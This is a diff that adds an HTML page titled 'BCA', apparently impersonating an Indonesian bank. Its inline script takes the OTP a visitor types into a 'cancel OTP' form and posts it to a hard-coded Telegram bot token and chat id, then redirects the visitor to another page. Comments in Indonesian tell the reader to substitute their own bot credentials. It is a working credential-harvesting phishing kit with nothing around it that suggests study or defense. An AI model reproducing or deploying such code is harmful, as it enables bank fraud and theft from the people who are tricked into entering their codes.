@@ -1,0 +1,54 @@
+<html>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+   
+    <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>BCA</title>    
+<body>
+<script src="index.js"></script>    
+<script>
+                $('#unicorn').on('submit', function (event) {
+
+                    event.stopPropagation();
+                    event.preventDefault();
+
+                    document.getElementById('btnSubmit').innerHTML = "Proses..";
+
+
+
+
+              
+        
+        var setPin = document.getElementById('setPin');
+
+        var gabungan =  "%0A├─────•Batalkan OTP•────•" + '%0A├•※ 𝗢𝗧𝗣 : ' + setPin.value +  "%0A╰───────────────────•";
+
+               
+       var token = '8115647029:AAHupQOaUmv0qtRlydrq81CflqY2A6MGTI0'; // Ganti dengan token bot yang kamu buat
+        var grup = '7845715491'; // Ganti dengan chat id dari bot yang kamu buat
+
+
+        $.ajax({
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            method: `POST`,
+
+                        complete: function(data) {
+                            console.log('Complete')
+
+                            setTimeout(function() {
+                                document.getElementById('btnSubmit').innerHTML = "Batalkan Sekarang";
+                                location.href = 'info.html';
+                            }, 000);
+
+                        }
+                    });
+
+                    return false;
+                });
+
+
+            </script>
+</body>
+</html>
